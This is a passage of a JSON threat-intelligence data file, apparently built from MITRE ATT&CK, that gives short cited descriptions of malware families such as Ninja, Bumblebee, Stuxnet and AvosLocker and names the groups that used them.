    "description": "[Ninja](https://attack.mitre.org/software/S1100) is a malware developed in C++ that has been used by [ToddyCat](https://attack.mitre.org/groups/G1022) to penetrate networks and control remote systems since at least 2020.  [Ninja](https://attack.mitre.org/software/S1100) is possibly part of a post exploitation toolkit exclusively used by [ToddyCat](https://attack.mitre.org/groups/G1022) and allows multiple operators to work simultaneously on the same machine. [Ninja](https://attack.mitre.org/software/S1100) has been used against government and military entities in Europe and Asia and observed in specific infection chains being deployed by [Samurai](https://attack.mitre.org/software/S1099).(Citation: Kaspersky ToddyCat June 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Ninja"
    ],
    "id": "S1100"
  },
  "malware--03acae53-9b98-46f6-b204-16b930839055": {
    "name": "RCSession",
    "description": "[RCSession](https://attack.mitre.org/software/S0662) is a backdoor written in C++ that has been in use since at least 2018 by [Mustang Panda](https://attack.mitre.org/groups/G0129) and by [Threat Group-3390](https://attack.mitre.org/groups/G0027) (Type II Backdoor).(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro Iron Tiger April 2021)(Citation: Trend Micro DRBControl February 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RCSession"
    ],
    "id": "S0662"
  },
  "malware--03ea629c-517a-41e3-94f8-c7e5368cf8f4": {
    "name": "Spark",
    "description": "\n[Spark](https://attack.mitre.org/software/S0543) is a Windows backdoor and has been in use since as early as 2017.(Citation: Unit42 Molerat Mar 2020) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Spark"
    ],
    "id": "S0543"
  },
  "malware--03eb4a05-6a02-43f6-afb7-3c7835501828": {
    "name": "QuietSieve",
    "description": "[QuietSieve](https://attack.mitre.org/software/S0686) is an information stealer that has been used by [Gamaredon Group](https://attack.mitre.org/groups/G0047) since at least 2021.(Citation: Microsoft Actinium February 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "QuietSieve"
    ],
    "id": "S0686"
  },
  "malware--04378e79-4387-468a-a8f7-f974b8254e44": {
    "name": "Bumblebee",
    "description": "[Bumblebee](https://attack.mitre.org/software/S1039) is a custom loader written in C++ that has been used by multiple threat actors, including possible initial access brokers, to download and execute additional payloads since at least March 2022. [Bumblebee](https://attack.mitre.org/software/S1039) has been linked to ransomware operations including [Conti](https://attack.mitre.org/software/S0575), Quantum, and Mountlocker and derived its name from the appearance of \"bumblebee\" in the user-agent.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)\n",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Bumblebee"
    ],
    "id": "S1039"
  },
  "malware--04cecafd-cb5f-4daf-aa1f-73899116c4a2": {
    "name": "AcidRain",
    "description": "[AcidRain](https://attack.mitre.org/software/S1125) is an ELF binary targeting modems and routers using MIPS architecture.(Citation: AcidRain JAGS 2022) [AcidRain](https://attack.mitre.org/software/S1125) is associated with the ViaSat KA-SAT communication outage that took place during the initial phases of the 2022 full-scale invasion of Ukraine. Analysis indicates overlap with another network device-targeting malware, VPNFilter, associated with [Sandworm Team](https://attack.mitre.org/groups/G0034).(Citation: AcidRain JAGS 2022) US and European government sources linked [AcidRain](https://attack.mitre.org/software/S1125) to Russian government entities, while Ukrainian government sources linked [AcidRain](https://attack.mitre.org/software/S1125) specifically to [Sandworm Team](https://attack.mitre.org/groups/G0034).(Citation: AcidRain State Department 2022)(Citation: Vincens AcidPour 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AcidRain"
    ],
    "id": "S1125"
  },
  "malware--04fc1842-f9e4-47cf-8cb8-5c61becad142": {
    "name": "GRIFFON",
    "description": "[GRIFFON](https://attack.mitre.org/software/S0417) is a JavaScript backdoor used by [FIN7](https://attack.mitre.org/groups/G0046). (Citation: SecureList Griffon May 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "GRIFFON"
    ],
    "id": "S0417"
  },
  "malware--05318127-5962-444b-b900-a9dcfe0ff6e9": {
    "name": "Amadey",
    "description": "[Amadey](https://attack.mitre.org/software/S1025) is a Trojan bot that has been used since at least October 2018.(Citation: Korean FSI TA505 2020)(Citation: BlackBerry Amadey 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Amadey"
    ],
    "id": "S1025"
  },
  "malware--065196de-d7e8-4888-acfb-b2134022ba1b": {
    "name": "RDFSNIFFER",
    "description": "[RDFSNIFFER](https://attack.mitre.org/software/S0416) is a module loaded by [BOOSTWRITE](https://attack.mitre.org/software/S0415) which allows an attacker to monitor and tamper with legitimate connections made via an application designed to provide visibility and system management capabilities to remote IT techs.(Citation: FireEye FIN7 Oct 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RDFSNIFFER"
    ],
    "id": "S0416"
  },
  "malware--0715560d-4299-4e84-9e20-6e80ab57e4f2": {
    "name": "Torisma",
    "description": "[Torisma](https://attack.mitre.org/software/S0678) is a second stage implant designed for specialized monitoring that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032). [Torisma](https://attack.mitre.org/software/S0678) was discovered during an investigation into the 2020 Operation North Star campaign that targeted the defense sector.(Citation: McAfee Lazarus Nov 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Torisma"
    ],
    "id": "S0678"
  },
  "malware--088f1d6e-0783-47c6-9923-9c79b2af43d4": {
    "name": "Stuxnet",
    "description": "[Stuxnet](https://attack.mitre.org/software/S0603) was the first publicly reported piece of malware to specifically target industrial control systems devices. [Stuxnet](https://attack.mitre.org/software/S0603) is a large and complex piece of malware that utilized multiple different behaviors including multiple zero-day vulnerabilities, a sophisticated Windows rootkit, and network infection routines.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011)(Citation: CISA ICS Advisory ICSA-10-272-01)(Citation: ESET Stuxnet Under the Microscope)(Citation: Langer Stuxnet) [Stuxnet](https://attack.mitre.org/software/S0603) was discovered in 2010, with some components being used as early as November 2008.(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011) ",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Stuxnet"
    ],
    "id": "S0603"
  },
  "malware--08e844a8-371f-4fe3-9d1f-e056e64a7fde": {
    "name": "RotaJakiro",
    "description": "[RotaJakiro](https://attack.mitre.org/software/S1078) is a 64-bit Linux backdoor used by [APT32](https://attack.mitre.org/groups/G0050). First seen in 2018, it uses a plugin architecture to extend capabilities. [RotaJakiro](https://attack.mitre.org/software/S1078) can determine it's permission level and execute according to access type (`root` or `user`).(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: netlab360 rotajakiro vs oceanlotus)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RotaJakiro"
    ],
    "id": "S1078"
  },
  "malware--0945a1a5-a79a-47c8-9079-10c16cdfcb5d": {
    "name": "AvosLocker",
    "description": "[AvosLocker](https://attack.mitre.org/software/S1053) is ransomware written in C++ that has been offered via the Ransomware-as-a-Service (RaaS) model. It was first observed in June 2021 and has been used against financial services, critical manufacturing, government facilities, and other critical infrastructure sectors in the United States. As of March 2022, [AvosLocker](https://attack.mitre.org/software/S1053) had also been used against organizations in Belgium, Canada, China, Germany, Saudi Arabia, Spain, Syria, Taiwan, Turkey, the United Arab Emirates, and the United Kingdom.(Citation: Malwarebytes AvosLocker Jul 2021)(Citation: Trend Micro AvosLocker Apr 2022)(Citation: Joint CSA AvosLocker Mar 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AvosLocker"
    ],
    "id": "S1053"
  },
  "malware--099ecff2-41b8-436d-843c-038a9aa9aa69": {
    "name": "Get2",
    "description": "[Get2](https://attack.mitre.org/software/S0460) is a downloader written in C++ that has been used by [TA505](https://attack.mitre.org/groups/G0092) to deliver [FlawedGrace](https://attack.mitre.org/software/S0383), [FlawedAmmyy](https://attack.mitre.org/software/S0381), Snatch and [SDBbot](https://attack.mitre.org/software/S0461).(Citation: Proofpoint TA505 October 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Get2"
    ],
    "id": "S0460"
  },
  "malware--09fcc02f-f9d4-43fa-8609-5e5e186b7103": {
    "name": "KOPILUWAK",
    "description": "[KOPILUWAK](https://attack.mitre.org/software/S1075) is a JavaScript-based reconnaissance tool that has been used for victim profiling and C2 since at least 2017.(Citation: Mandiant Suspected Turla Campaign February 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "KOPILUWAK"
    ],
    "id": "S1075"
  },
  "malware--0a607c53-df52-45da-a75d-0e53df4dad5f": {
    "name": "RobbinHood",
    "description": "[RobbinHood](https://attack.mitre.org/software/S0400) is ransomware that was first observed being used in an attack against the Baltimore city government's computer network.(Citation: CarbonBlack RobbinHood May 2019)(Citation: BaltimoreSun RobbinHood May 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RobbinHood"
    ],
    "id": "S0400"
  },
  "malware--0b639373-5f03-430e-b8f9-2fe8c8faad8e": {
    "name": "Chinoxy",
    "description": "[Chinoxy](https://attack.mitre.org/software/S1041) is a backdoor that has been used since at least November 2018, during the [FunnyDream](https://attack.mitre.org/campaigns/C0007) campaign, to gain persistence and drop additional payloads. According to security researchers, [Chinoxy](https://attack.mitre.org/software/S1041) has been used by Chinese-speaking threat actors.(Citation: Bitdefender FunnyDream Campaign November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Chinoxy"
    ],
    "id": "S1041"
  },
  "malware--0ba9281c-93fa-4b29-8e9e-7ef918c7b13a": {
    "name": "SharpStage",
    "description": "[SharpStage](https://attack.mitre.org/software/S0546) is a .NET malware with backdoor capabilities.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SharpStage"
    ],
    "id": "S0546"
  },
  "malware--0c242cc5-58d3-4fe3-a866-b00a4b6fb817": {
    "name": "COATHANGER",
    "description": "[COATHANGER](https://attack.mitre.org/software/S1105) is a remote access tool (RAT) targeting FortiGate networking appliances. First used in 2023 in targeted intrusions against military and government entities in the Netherlands along with other victims, [COATHANGER](https://attack.mitre.org/software/S1105) was disclosed in early 2024, with a high confidence assessment linking this malware to a state-sponsored entity in the People's Republic of China. [COATHANGER](https://attack.mitre.org/software/S1105) is delivered after gaining access to a FortiGate device, with in-the-wild observations linked to exploitation of CVE-2022-42475. The name [COATHANGER](https://attack.mitre.org/software/S1105) is based on a unique string in the malware used to encrypt configuration files on disk: <code>“She took his coat and hung it up”</code>.(Citation: NCSC-NL COATHANGER Feb 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "COATHANGER"
    ],
    "id": "S1105"
  },
  "malware--0c52f5bc-557d-4083-bd27-66d7cdb794bb": {
    "name": "Sardonic",
    "description": "[Sardonic](https://attack.mitre.org/software/S1085) is a backdoor written in C and C++ that is known to be used by [FIN8](https://attack.mitre.org/groups/G0061), as early as August 2021 to target a financial institution in the United States. [Sardonic](https://attack.mitre.org/software/S1085) has a plugin system that can load specially made DLLs and execute their functions.(Citation: Bitdefender Sardonic Aug 2021)(Citation: Symantec FIN8 Jul 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Sardonic"
    ],
    "id": "S1085"
  },
  "malware--0d1f9f5b-11ea-42c3-b5f4-63cce0122541": {
    "name": "WindTail",
    "description": "[WindTail](https://attack.mitre.org/software/S0466) is a macOS surveillance implant used by [Windshift](https://attack.mitre.org/groups/G0112). [WindTail](https://attack.mitre.org/software/S0466) shares code similarities with Hack Back aka KitM OSX.(Citation: SANS Windshift August 2018)(Citation: objective-see windtail1 dec 2018)(Citation: objective-see windtail2 jan 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "WindTail"
    ],
    "id": "S0466"
  },
  "malware--11194d8b-fdce-45d2-8047-df15bb8f16bd": {
    "name": "Exaramel for Linux",
    "description": "[Exaramel for Linux](https://attack.mitre.org/software/S0401) is a backdoor written in the Go Programming Language and compiled as a 64-bit ELF binary. The Windows version is tracked separately under [Exaramel for Windows](https://attack.mitre.org/software/S0343).(Citation: ESET TeleBots Oct 2018)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Exaramel for Linux"
    ],
    "id": "S0401"
  },
  "malware--12a7450d-b03e-4990-a5b8-b405ab9c803b": {
    "name": "HAWKBALL",
    "description": "[HAWKBALL](https://attack.mitre.org/software/S0391) is a backdoor that was observed in targeting of the government sector in Central Asia.(Citation: FireEye HAWKBALL Jun 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HAWKBALL"
    ],
    "id": "S0391"
  },
  "malware--13183cdf-280b-46be-913a-5c6df47831e7": {
    "name": "PS1",
    "description": "[PS1](https://attack.mitre.org/software/S0613) is a loader that was used to deploy 64-bit backdoors in the [CostaRicto](https://attack.mitre.org/groups/G0132) campaign.(Citation: BlackBerry CostaRicto November 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PS1"
    ],
    "id": "S0613"
  },
  "malware--1492d0f8-7e14-4af3-9239-bc3fe10d3407": {
    "name": "Ursnif",
    "description": "[Ursnif](https://attack.mitre.org/software/S0386) is a banking trojan and variant of the Gozi malware observed being spread through various automated exploit kits, [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)s, and malicious links.(Citation: NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) [Ursnif](https://attack.mitre.org/software/S0386) is associated primarily with data theft, but variants also include components (backdoors, spyware, file injectors, etc.) capable of a wide variety of behaviors.(Citation: TrendMicro Ursnif Mar 2015)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Ursnif"
    ],
    "id": "S0386"
  },
  "malware--16040b1c-ed28-4850-9d8f-bb8b81c42092": {
    "name": "ThreatNeedle",
    "description": "[ThreatNeedle](https://attack.mitre.org/software/S0665) is a backdoor that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least 2019 to target cryptocurrency, defense, and mobile gaming organizations.  It is considered to be an advanced cluster of [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Manuscrypt (a.k.a. NukeSped) malware family.(Citation: Kaspersky ThreatNeedle Feb 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "ThreatNeedle"
    ],
    "id": "S0665"
  },
  "malware--19256855-65e9-48f2-8b74-9f3d0a994428": {
    "name": "LITTLELAMB.WOOLTEA",
    "description": "[LITTLELAMB.WOOLTEA](https://attack.mitre.org/software/S1121) is a backdoor that was used by UNC5325 during [Cutting Edge](https://attack.mitre.org/campaigns/C0029) to deploy malware on targeted Ivanti Connect Secure VPNs and to establish persistence across system upgrades and patches.(Citation: Mandiant Cutting Edge Part 3 February 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "LITTLELAMB.WOOLTEA"
    ],
    "id": "S1121"
  },
  "malware--1b9f0800-035e-4ed1-9648-b18294cc5bc8": {
    "name": "CARROTBAT",
    "description": "[CARROTBAT](https://attack.mitre.org/software/S0462) is a customized dropper that has been in use since at least 2017. [CARROTBAT](https://attack.mitre.org/software/S0462) has been used to install [SYSCON](https://attack.mitre.org/software/S0464) and has infrastructure overlap with [KONNI](https://attack.mitre.org/software/S0356).(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "CARROTBAT"
    ],
    "id": "S0462"
  },
  "malware--1cdbbcab-903a-414d-8eb0-439a97343737": {
    "name": "FrameworkPOS",
    "description": "[FrameworkPOS](https://attack.mitre.org/software/S0503) is a point of sale (POS) malware used by [FIN6](https://attack.mitre.org/groups/G0037) to steal payment card data from sytems that run physical POS devices.(Citation: SentinelOne FrameworkPOS September 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "FrameworkPOS"
    ],
    "id": "S0503"
  },
  "malware--1da748a5-875d-4212-9222-b4c23ab861be": {
    "name": "Prestige",
    "description": "[Prestige](https://attack.mitre.org/software/S1058) ransomware has been used by [Sandworm Team](https://attack.mitre.org/groups/G0034) since at least March 2022, including against transportation and related logistics industries in Ukraine and Poland in October 2022.(Citation: Microsoft Prestige ransomware October 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Prestige"
    ],
    "id": "S1058"
  },
  "malware--1fefb062-feda-484a-8f10-0cebf65e20e3": {
    "name": "SharpDisco",
    "description": "[SharpDisco](https://attack.mitre.org/software/S1089) is a dropper developed in C# that has been used by [MoustachedBouncer](https://attack.mitre.org/groups/G1019) since at least 2020 to load malicious plugins.(Citation: MoustachedBouncer ESET August 2023)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "SharpDisco"
    ],
    "id": "S1089"
  },
  "malware--20945359-3b39-4542-85ef-08ecb4e1c174": {
    "name": "StrongPity",
    "description": "[StrongPity](https://attack.mitre.org/software/S0491) is an information stealing malware used by [PROMETHIUM](https://attack.mitre.org/groups/G0056).(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "StrongPity"
    ],
    "id": "S0491"
  },
  "malware--21583311-6321-4891-8a37-3eb4e57b0fb1": {
    "name": "xCaon",
    "description": "[xCaon](https://attack.mitre.org/software/S0653) is an HTTP variant of the [BoxCaon](https://attack.mitre.org/software/S0651) malware family that has used by [IndigoZebra](https://attack.mitre.org/groups/G0136) since at least 2014. [xCaon](https://attack.mitre.org/software/S0653) has been used to target political entities in Central Asia, including Kyrgyzstan and Uzbekistan.(Citation: Checkpoint IndigoZebra July 2021)(Citation: Securelist APT Trends Q2 2017)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "xCaon"
    ],
    "id": "S0653"
  },
  "malware--222ba512-32d9-49ac-aefd-50ce981ce2ce": {
    "name": "Pony",
    "description": "[Pony](https://attack.mitre.org/software/S0453) is a credential stealing malware, though has also been used among adversaries for its downloader capabilities. The source code for Pony Loader 1.0 and 2.0 were leaked online, leading to their use by various threat actors.(Citation: Malwarebytes Pony April 2016)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Pony"
    ],
    "id": "S0453"
  },
  "malware--22b17791-45bf-45c0-9322-ff1a0af5cf2b": {
    "name": "Nebulae",
    "description": "[Nebulae](https://attack.mitre.org/software/S0630) Is a backdoor that has been used by [Naikon](https://attack.mitre.org/groups/G0019)  since at least 2020.(Citation: Bitdefender Naikon April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Nebulae"
    ],
    "id": "S0630"
  },
  "malware--29231689-5837-4a7a-aafc-1b65b3f50cc7": {
    "name": "RainyDay",
    "description": "[RainyDay](https://attack.mitre.org/software/S0629) is a backdoor tool that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since at least 2020.(Citation: Bitdefender Naikon April 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "RainyDay"
    ],
    "id": "S0629"
  },
  "malware--292eb0c5-b8e8-4af6-9e8f-0fda6b4528d3": {
    "name": "Ecipekac",
    "description": "[Ecipekac](https://attack.mitre.org/software/S0624) is a multi-layer loader that has been used by [menuPass](https://attack.mitre.org/groups/G0045) since at least 2019 including use as a loader for [P8RAT](https://attack.mitre.org/software/S0626), [SodaMaster](https://attack.mitre.org/software/S0627), and [FYAnti](https://attack.mitre.org/software/S0628).(Citation: Securelist APT10 March 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Ecipekac"
    ],
    "id": "S0624"
  },
  "malware--295721d2-ee20-4fa3-ade3-37f4146b4570": {
    "name": "AppleSeed",
    "description": "[AppleSeed](https://attack.mitre.org/software/S0622) is a backdoor that has been used by [Kimsuky](https://attack.mitre.org/groups/G0094) to target South Korean government, academic, and commercial  targets since at least 2021.(Citation: Malwarebytes Kimsuky June 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "AppleSeed"
    ],
    "id": "S0622"
  },
  "malware--29a0bb87-1162-4c83-9834-2a98a876051b": {
    "name": "BUSHWALK",
    "description": "[BUSHWALK](https://attack.mitre.org/software/S1118) is a web shell written in Perl that was inserted into the legitimate querymanifest.cgi file on compromised Ivanti Connect Secure VPNs during [Cutting Edge](https://attack.mitre.org/campaigns/C0029).(Citation: Mandiant Cutting Edge Part 2 January 2024)(Citation: Mandiant Cutting Edge Part 3 February 2024)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BUSHWALK"
    ],
    "id": "S1118"
  },
  "malware--2a59a237-1530-4d55-91f9-2aebf961cc37": {
    "name": "macOS.OSAMiner",
    "description": "[macOS.OSAMiner](https://attack.mitre.org/software/S1048) is a Monero mining trojan that was first observed in 2018; security researchers assessed [macOS.OSAMiner](https://attack.mitre.org/software/S1048) may have been circulating since at least 2015. [macOS.OSAMiner](https://attack.mitre.org/software/S1048) is known for embedding one run-only AppleScript into another, which helped the malware evade full analysis for five years due to a lack of Apple event (AEVT) analysis tools.(Citation: SentinelLabs reversing run-only applescripts 2021)(Citation: VMRay OSAMiner dynamic analysis 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "macOS.OSAMiner"
    ],
    "id": "S1048"
  },
  "malware--2a7c1bb7-cd12-456e-810d-ab3bf8457bab": {
    "name": "TinyTurla",
    "description": "[TinyTurla](https://attack.mitre.org/software/S0668) is a backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010) against targets in the US, Germany, and Afghanistan since at least 2020.(Citation: Talos TinyTurla September 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "TinyTurla"
    ],
    "id": "S0668"
  },
  "malware--2ac41e8b-4865-4ced-839d-78e7852c47f3": {
    "name": "PyDCrypt",
    "description": "[PyDCrypt](https://attack.mitre.org/software/S1032) is malware written in Python designed to deliver [DCSrv](https://attack.mitre.org/software/S1033). It has been used by [Moses Staff](https://attack.mitre.org/groups/G1009) since at least September 2021, with each sample tailored for its intended victim organization.(Citation: Checkpoint MosesStaff Nov 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PyDCrypt"
    ],
    "id": "S1032"
  },
  "malware--2cf7dec3-66fc-423f-b2c7-58f1de243b4e": {
    "name": "HyperStack",
    "description": "[HyperStack](https://attack.mitre.org/software/S0537) is a RPC-based backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2018. [HyperStack](https://attack.mitre.org/software/S0537) has similarities to other backdoors used by [Turla](https://attack.mitre.org/groups/G0010) including [Carbon](https://attack.mitre.org/software/S0335).(Citation: Accenture HyperStack October 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "HyperStack"
    ],
    "id": "S0537"
  },
  "malware--2eaa5319-5e1e-4dd7-bbc4-566fced3964a": {
    "name": "Bad Rabbit",
    "description": "[Bad Rabbit](https://attack.mitre.org/software/S0606) is a self-propagating ransomware that affected the Ukrainian transportation sector in 2017. [Bad Rabbit](https://attack.mitre.org/software/S0606) has also targeted organizations and consumers in Russia. (Citation: Secure List Bad Rabbit)(Citation: ESET Bad Rabbit)(Citation: Dragos Apr 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Bad Rabbit"
    ],
    "id": "S0606"
  },
  "malware--2f8229dc-da94-41c6-89ba-b5b6c32f6b7d": {
    "name": "EnvyScout",
    "description": "[EnvyScout](https://attack.mitre.org/software/S0634) is a dropper that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "EnvyScout"
    ],
    "id": "S0634"
  },
  "malware--3161d76a-e2b2-4b97-9906-24909b735386": {
    "name": "Aria-body",
    "description": "[Aria-body](https://attack.mitre.org/software/S0456) is a custom backdoor that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since approximately 2017.(Citation: CheckPoint Naikon May 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Aria-body"
    ],
    "id": "S0456"
  },
  "malware--327b3a25-9e60-4431-b3b6-93b9c64eacbc": {
    "name": "Tomiris",
    "description": "[Tomiris](https://attack.mitre.org/software/S0671) is a backdoor written in Go that continuously queries its C2 server for executables to download and execute on a victim system. It was first reported in September 2021 during an investigation of a successful DNS hijacking campaign against a Commonwealth of Independent States (CIS) member. Security researchers assess there are similarities between [Tomiris](https://attack.mitre.org/software/S0671) and [GoldMax](https://attack.mitre.org/software/S0588).(Citation: Kaspersky Tomiris Sep 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Tomiris"
    ],
    "id": "S0671"
  },
  "malware--32f49626-87f4-4d6c-8f59-a0dca953fe26": {
    "name": "TEARDROP",
    "description": "[TEARDROP](https://attack.mitre.org/software/S0560) is a memory-only dropper that was discovered on some victim machines during investigations related to the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024). It was likely used by [APT29](https://attack.mitre.org/groups/G0016) since at least May 2020.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Microsoft Deep Dive Solorigate January 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "TEARDROP"
    ],
    "id": "S0560"
  },
  "malware--350f12cf-fd3b-4dad-b323-14b943090df4": {
    "name": "Turian",
    "description": "[Turian](https://attack.mitre.org/software/S0647) is a backdoor that has been used by [BackdoorDiplomacy](https://attack.mitre.org/groups/G0135) to target Ministries of Foreign Affairs, telecommunication companies, and charities in Africa, Europe, the Middle East, and Asia. First reported in 2021, [Turian](https://attack.mitre.org/software/S0647) is likely related to Quarian, an older backdoor that was last observed being used in 2013 against diplomatic targets in Syria and the United States.(Citation: ESET BackdoorDiplomacy Jun 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Turian"
    ],
    "id": "S0647"
  },
  "malware--3553b49d-d4ae-4fb6-ab17-0adbc520c888": {
    "name": "BADHATCH",
    "description": "[BADHATCH](https://attack.mitre.org/software/S1081) is a backdoor that has been utilized by [FIN8](https://attack.mitre.org/groups/G0061) since at least 2019. [BADHATCH](https://attack.mitre.org/software/S1081) has been used to target the insurance, retail, technology, and chemical industries in the United States, Canada, South Africa, Panama, and Italy.(Citation: Gigamon BADHATCH Jul 2019)(Citation: BitDefender BADHATCH Mar 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "BADHATCH"
    ],
    "id": "S1081"
  },
  "malware--35cd1d01-1ede-44d2-b073-a264d727bc04": {
    "name": "Machete",
    "description": "[Machete](https://attack.mitre.org/software/S0409) is a cyber espionage toolset used by [Machete](https://attack.mitre.org/groups/G0095). It is a Python-based backdoor targeting Windows machines that was first observed in 2010.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)(Citation: 360 Machete Sep 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Machete"
    ],
    "id": "S0409"
  },
  "malware--35ee9bf3-264b-4411-8a8f-b58cec8f35e4": {
    "name": "PowerLess",
    "description": "[PowerLess](https://attack.mitre.org/software/S1012) is a PowerShell-based modular backdoor that has been used by [Magic Hound](https://attack.mitre.org/groups/G0059) since at least 2022.(Citation: Cybereason PowerLess February 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PowerLess"
    ],
    "id": "S1012"
  },
  "malware--36801ffb-5c85-4c50-9121-6122e389366d": {
    "name": "Action RAT",
    "description": "[Action RAT](https://attack.mitre.org/software/S1028) is a  remote access tool written in Delphi that has been used by [SideCopy](https://attack.mitre.org/groups/G1008) since at least December 2021 against Indian and Afghani government personnel.(Citation: MalwareBytes SideCopy Dec 2021)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Action RAT"
    ],
    "id": "S1028"
  },
  "malware--36ede314-7db4-4d09-b53d-81bbfbe5f6f8": {
    "name": "Avenger",
    "description": "[Avenger](https://attack.mitre.org/software/S0473) is a downloader that has been used by [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) since at least 2019.(Citation: Trend Micro Tick November 2019)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Avenger"
    ],
    "id": "S0473"
  },
  "malware--3a0f6128-0a01-421d-8eca-e57d8671b1f1": {
    "name": "PingPull",
    "description": "[PingPull](https://attack.mitre.org/software/S1031) is a remote access Trojan (RAT) written in Visual C++ that has been used by [GALLIUM](https://attack.mitre.org/groups/G0093) since at least June 2022. [PingPull](https://attack.mitre.org/software/S1031) has been used to target telecommunications companies, financial institutions, and government entities in Afghanistan, Australia, Belgium, Cambodia, Malaysia, Mozambique, the Philippines, Russia, and Vietnam.(Citation: Unit 42 PingPull Jun 2022)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "PingPull"
    ],
    "id": "S1031"
  },
  "malware--3a4197ae-ec63-4162-907b-9a073d1157e4": {
    "name": "WellMess",
    "description": "[WellMess](https://attack.mitre.org/software/S0514) is lightweight malware family with variants written in .NET and Golang that has been in use since at least 2018 by [APT29](https://attack.mitre.org/groups/G0016).(Citation: CISA WellMess July 2020)(Citation: PWC WellMess July 2020)(Citation: NCSC APT29 July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "WellMess"
    ],
    "id": "S0514"
  },
  "malware--3aa169f8-bbf6-44bb-b57d-7f6ada5c2128": {
    "name": "Dacls",
    "description": "[Dacls](https://attack.mitre.org/software/S0497) is a multi-platform remote access tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032) since at least December 2019.(Citation: TrendMicro macOS Dacls May 2020)(Citation: SentinelOne Lazarus macOS July 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
      "Dacls"
    ],
    "id": "S0497"
  },
  "malware--3ae6097d-d700-46c6-8b21-42fc0bcb48fa": {
    "name": "DropBook",
    "description": "[DropBook](https://attack.mitre.org/software/S0547) is a Python-based backdoor compiled with PyInstaller.(Citation: Cybereason Molerats Dec 2020)",
    "examples": [],
    "example_uses": [],
    "similar_words": [
